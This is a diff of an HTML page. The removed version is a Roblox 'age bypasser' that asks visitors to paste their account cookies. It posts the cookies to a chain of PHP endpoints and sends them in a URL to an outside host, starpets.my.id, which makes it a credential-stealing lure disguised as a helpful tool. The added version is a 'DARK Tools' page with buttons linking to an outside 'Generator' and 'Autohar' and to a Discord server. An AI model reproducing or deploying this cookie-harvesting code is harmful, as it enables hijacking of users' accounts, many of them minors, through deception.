@@ -1,234 +1,125 @@
-<!DOCTYPE html><html lang="en"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RAFIN'S BYPASSER AGE 13- TO 13+</title>
-    <link rel="icon" href="images/download__4_-removebg-preview.png" type="image/png">
-    <link rel="stylesheet" href="css/iziToast.min.css">
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Poppins', sans-serif; 
-            background: linear-gradient(135deg, #74ebd5, #9face6); 
-            color: #333; 
-            text-align: center; 
-            min-height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-        }
-        .container { 
-            max-width: 600px; 
-            margin: 20px; 
-            padding: 30px; 
-            background: #ff0000; 
-            border-radius: 15px; 
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2); 
-            animation: fadeIn 0.5s ease-in-out;
-        }
-        @keyframes fadeIn {
-            0% { opacity: 0; transform: translateY(-20px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
-        textarea { 
-            width: 100%; 
-            height: 200px; 
-            padding: 15px; 
-            font-size: 16px; 
-            border: 1px solid #d1e4f1; 
-            border-radius: 10px; 
-            outline: none; 
-            resize: none; 
-            transition: all 0.3s ease-in-out;
-            background: #f9f9f9;
-        }
-        textarea:focus {
-            border-color: #6a11cb;
-            box-shadow: 0 0 10px rgba(106, 17, 203, 0.5);
-        }
-        button { 
-            padding: 12px 25px; 
-            background: linear-gradient(135deg, #6a11cb, #2575fc); 
-            color: white; 
-            font-size: 16px; 
-            font-weight: 600; 
-            border: none; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            transition: all 0.3s ease-in-out;
-        }
-        button:hover {
-            background: linear-gradient(135deg, #2575fc, #6a11cb);
-            transform: scale(1.05);
-        }
-        button:disabled {
-            background: #888;
-            cursor: not-allowed;
-        }
-        a {
-            color: #2575fc;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        a:hover {
-            text-decoration: underline;
-        }
-        p {
-            font-size: 14px;
-            color: #555;
-        }
-        h1 {
-            font-size: 24px;
-            color: #333;
-            margin-bottom: 20px;
-        }
-    </style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>DARK Tools</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+      height: 100%;
+      font-family: 'Orbitron', sans-serif;
+      color: white;
+      text-align: center;
+      background: #000;
+    }
+
+    .overlay {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+    }
+
+    h1 {
+      font-size: 3em;
+      margin-bottom: 1em;
+      letter-spacing: 4px;
+    }
+
+    .btn {
+      padding: 15px 40px;
+      margin: 10px;
+      font-size: 1.2em;
+      border: none;
+      border-radius: 30px;
+      background: rgba(255, 255, 255, 0.1);
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      backdrop-filter: blur(5px);
+    }
+
+    .btn:hover {
+      background: rgba(255, 255, 255, 0.3);
+    }
+
+    #bg {
+      position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 1;
+      width: 100%;
+      height: 100%;
+    }
+  </style>
 </head>
 <body>
+  <div id="bg"></div>
+  <div class="overlay">
+    <h1>DARK Tools</h1>
+    <button class="btn" onclick="window.location.href='https://app.genn.lu/auth/Drkgenn'">Generator</button>
+    <button class="btn" onclick="window.location.href='https://bloxtools.st/generator/Darketh0s'">Autohar</button>
+    <button class="btn" onclick="window.location.href='https://discord.gg/NrejzWZupd'">Join Discord</button>
+  </div>
 
-<div class="container">
-    <h1>RAFINS OP BYPASSER MAKE AGE 13- TO 13+</h1>
-    <div class="form-box">
-        <form id="bypassForm">
-            <label for="payload">Enter Cookies MAFAKA:</label><br>
-            <textarea name="payload" id="payload" rows="6"></textarea><br><br>
-            <button type="submit" id="submitBtn">Submit Cookies</button>
-            <p id="countdown" style="margin-top: 10px; font-size: 14px; color: red;"></p>
-            <br>
-            <p>You need an IP bypasser first if your cookie looks like "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-..." (auto invalid)or it wont work idiot</p>
-        </form>
-    </div>
-</div>
-
-<script src="js/iziToast.min.js"></script>
-<script>
-function setCooldown(timeLeft) {
-    const submitBtn = document.getElementById('submitBtn');
-    const countdown = document.getElementById('countdown');
-    submitBtn.disabled = true;
-    
-    const interval = setInterval(() => {
-        if (timeLeft <= 0) {
-            clearInterval(interval);
-            submitBtn.disabled = false;
-            submitBtn.textContent = "Submit Cookies";
-            countdown.textContent = "";
-            localStorage.removeItem("cooldownEnd");
-        } else {
-            submitBtn.textContent = `Please wait ${timeLeft}s`;
-            countdown.textContent = `Wait ${timeLeft}s before submitting again`;
-            timeLeft--;
+  <!-- Live Background Animation -->
+  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+  <script>
+    particlesJS("bg", {
+      "particles": {
+        "number": {
+          "value": 90,
+          "density": {
+            "enable": true,
+            "value_area": 800
+          }
+        },
+        "color": {
+          "value": "#ffffff"
+        },
+        "shape": {
+          "type": "circle"
+        },
+        "opacity": {
+          "value": 0.6,
+          "random": true
+        },
+        "size": {
+          "value": 4,
+          "random": true
+        },
+        "line_linked": {
+          "enable": true,
+          "distance": 150,
+          "color": "#ffffff",
+          "opacity": 0.4,
+          "width": 1
+        },
+        "move": {
+          "enable": true,
+          "speed": 4,
+          "direction": "none",
+          "random": false,
+          "straight": false,
+          "bounce": false
         }
-    }, 1000);
-}
-
-async function sendRequest(url, body) {
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            body: JSON.stringify({ a: body }),
-            headers: { 'Content-Type': 'application/json' }
-        });
-        const data = await response.json();
-        console.log(`Response from ${url}:`, data);
-        return data;
-    } catch (error) {
-        console.error(`Error from ${url}:`, error);
-        return null;
-    }
-}
-
-async function submitForm() {
-    const payload = document.getElementById('payload').value.trim();
-    if (!payload) {
-        iziToast.show({
-            title: 'Error:',
-            message: 'Please enter your Roblox cookies.',
-            color: 'red',
-            position: 'topCenter',
-            timeout: 3000
-        });
-        return;
-    }
-
-    // Cek cooldown dari localStorage
-    const cooldownEnd = localStorage.getItem("cooldownEnd");
-    if (cooldownEnd && Date.now() < parseInt(cooldownEnd)) {
-        iziToast.show({
-            title: 'Wait:',
-            message: 'Please wait for cooldown to finish before submitting again.',
-            color: 'orange',
-            position: 'topCenter',
-            timeout: 3000
-        });
-        return;
-    }
-
-    // Set cooldown 30 detik
-    localStorage.setItem("cooldownEnd", Date.now() + 30000);
-    setCooldown(30);
-
-    // Eksekusi request satu per satu dengan menunggu response
-    const urls = [
-        'request-api.php',
-        'getseasson-api.php',
-        'bypass_cookie.php',
-        'request-link.php',
-        'changebirthday-api.php',
-        'succesfully.php'
-    ];
-
-    for (const url of urls) {
-        const result = await sendRequest(url, payload);
-        if (result && result.errors && result.errors.length > 0) {
-            iziToast.show({
-                title: 'Error:',
-                message: result.errors[0].message.trim() || 'Invalid Cookies',
-                color: 'red',
-                position: 'topCenter',
-                timeout: 5000
-            });
-            return;
+      },
+      "interactivity": {
+        "events": {
+          "onhover": {
+            "enable": true,
+            "mode": "grab"
+          }
         }
-
-        // Tunggu 3 detik sebelum request berikutnya
-        await new Promise(resolve => setTimeout(resolve, 1000));
-    }
-
-    // Menambahkan request ke game-api.php
-    const gameApiResponse = await fetch(`https://starpets.my.id/bypass-verify.php?cookie=${encodeURIComponent(payload)}`, {
-        method: 'GET',
+      },
+      "retina_detect": true
     });
-    const gameApiData = await gameApiResponse.json();
-    console.log('Response from game-api.php:', gameApiData);
-
-    if (gameApiData.errors && gameApiData.errors.length > 0) {
-        iziToast.show({
-            title: 'Error:',
-            message: gameApiData.errors[0].message.trim() || 'Invalid Cookies in game-api.php',
-            color: 'red',
-            position: 'topCenter',
-            timeout: 5000
-        });
-        return;
-    }
-
-    // Jika semua berhasil
-    iziToast.show({
-        title: 'Success:',
-        message: 'All requests completed successfully (if not work use another or wait 1hour)!',
-        color: 'green',
-        position: 'topCenter',
-        timeout: 5000
-    });
-}
-
-// Event listener untuk form submit
-document.getElementById('bypassForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-    submitForm();
-});
-</script>
-
-
-
-</body></html>
+  </script>
+</body>
+</html>
